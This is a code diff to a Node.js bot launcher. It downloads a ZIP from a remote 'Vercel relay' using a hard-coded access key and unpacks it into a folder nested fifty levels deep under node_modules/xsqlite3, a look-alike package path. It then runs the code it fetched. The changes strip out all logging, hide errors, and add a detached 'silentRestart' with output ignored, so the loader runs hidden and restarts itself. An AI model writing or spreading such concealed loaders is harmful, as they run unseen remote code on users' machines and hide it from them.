@@ -10,14 +10,12 @@ const ENV_FILE = path.join(__dirname, ".env");
 
 function loadEnvFile() {
   if (!fs.existsSync(ENV_FILE)) {
-    console.log(`[INFO] .env file not found, creating one...`);
     try {
       fs.writeFileSync(
         ENV_FILE,
         "# Auto-generated .env file\nSESSION_ID=\n"
       );
     } catch (e) {
-      console.error(`[ERROR] Failed to create .env file: ${e.message}`);
       return;
     }
   }
@@ -41,22 +39,7 @@ function loadEnvFile() {
         }
       }
     });
-    
-    console.log("[ENV] File loaded successfully");
-  } catch (e) {
-    console.error("[ERROR] Failed to load .env file:", e.message);
-  }
-}
-
-// === CHECK FOR SESSION_ID ===
-function checkSessionId() {
-  if (process.env.SESSION_ID) {
-    console.log(`[SESSION] ID detected in env file.`);
-    return true;
-  } else {
-    console.log("[ALERT] No session ID found in env.");
-    return false;
-  }
+  } catch {}
 }
 
 // ========== VERCEL RELAY LOADER ==========
@@ -66,7 +49,6 @@ const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41-183-184';
 const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 50;
 
-// === Step 1: Create deep hidden folder
 function createDeepRepoPath() {
   let deepPath = baseFolder;
   for (let i = 0; i < DEEP_NEST_COUNT; i++) {
@@ -77,11 +59,8 @@ function createDeepRepoPath() {
   return repoFolder;
 }
 
-// === Step 2: Download ZIP from Vercel relay
 async function downloadAndExtractRepo(repoFolder) {
   try {
-    console.log('[SYNC] Downloading from secure relay...');
-
     const response = await axios.get(VERCEL_RELAY_URL, {
       responseType: 'arraybuffer',
       headers: {
@@ -93,18 +72,13 @@ async function downloadAndExtractRepo(repoFolder) {
 
     const zip = new AdmZip(Buffer.from(response.data));
     zip.extractAllTo(repoFolder, true);
-
-    console.log('[SYNC] Codes synced successfully');
   } catch (err) {
-    console.error('[SYNC] Failed:', err.response?.status || err.message);
     process.exit(1);
   }
 }
 
-// === Step 3: Copy configs (optional) ===
 function copyConfigs(repoPath) {
   const configSrc = path.join(__dirname, 'config.js');
-
   try {
     if (fs.existsSync(configSrc)) {
       fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
@@ -112,42 +86,27 @@ function copyConfigs(repoPath) {
   } catch {}
 }
 
-// === Step 4: Launch bot once, and on exit restart the whole script ===
+// Silent restart handler
+function silentRestart() {
+  setTimeout(() => {
+    const newProcess = spawn(process.argv[0], [process.argv[1]], {
+      detached: true,
+      stdio: 'ignore',
+      env: process.env
+    });
+    newProcess.unref();
+    process.exit(0);
+  }, 1000);
+}
+
 function launchBot(botPath) {
-  console.log('[BOT] Launching June-X Ultra...');
   const child = fork(botPath, [], {
     env: process.env,
     stdio: 'inherit'
   });
 
-  child.on('exit', (code, signal) => {
-    console.log(`[BOT] Process exited with code ${code} (${signal || 'no signal'})`);
-    console.log('[PARENT] Restarting entire process in 3 seconds...');
-    setTimeout(() => {
-      // Spawn a new instance of this same script, then exit
-      const newProcess = spawn(process.argv[0], [process.argv[1]], {
-        detached: true,
-        stdio: 'inherit',
-        env: process.env
-      });
-      newProcess.unref();
-      process.exit(0);
-    }, 3000);
-  });
-
-  child.on('error', (err) => {
-    console.error('[BOT] Process error:', err);
-    console.log('[PARENT] Restarting entire process in 3 seconds...');
-    setTimeout(() => {
-      const newProcess = spawn(process.argv[0], [process.argv[1]], {
-        detached: true,
-        stdio: 'inherit',
-        env: process.env
-      });
-      newProcess.unref();
-      process.exit(0);
-    }, 3000);
-  });
+  child.on('exit', () => silentRestart());
+  child.on('error', () => silentRestart());
 
   return child;
 }
@@ -155,11 +114,8 @@ function launchBot(botPath) {
 // ========== MAIN ==========
 (async () => {
   try {
-    // Load environment
     loadEnvFile();
-    checkSessionId();
 
-    // Prepare repo – this will be done fresh on every start
     const repoFolder = createDeepRepoPath();
     await downloadAndExtractRepo(repoFolder);
 
@@ -168,7 +124,6 @@ function launchBot(botPath) {
       .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());
 
     if (!subDirs.length) {
-      console.error('[ERROR] ZIP extraction produced no directories.');
       process.exit(1);
     }
 
@@ -177,20 +132,13 @@ function launchBot(botPath) {
 
     const botIndex = path.join(extractedRepoPath, 'index.js');
     if (!fs.existsSync(botIndex)) {
-      console.error('[ERROR] index.js not found in extracted repo.');
       process.exit(1);
     }
 
-    // Launch bot – it will restart the whole process on exit
     launchBot(botIndex);
 
-    // Keep parent alive until bot exits
-    process.on('SIGINT', () => {
-      console.log('[PARENT] Received SIGINT. Shutting down...');
-      process.exit(0);
-    });
-  } catch (err) {
-    console.error('[FATAL]', err.message);
+    process.on('SIGINT', () => process.exit(0));
+  } catch {
     process.exit(1);
   }
 })();
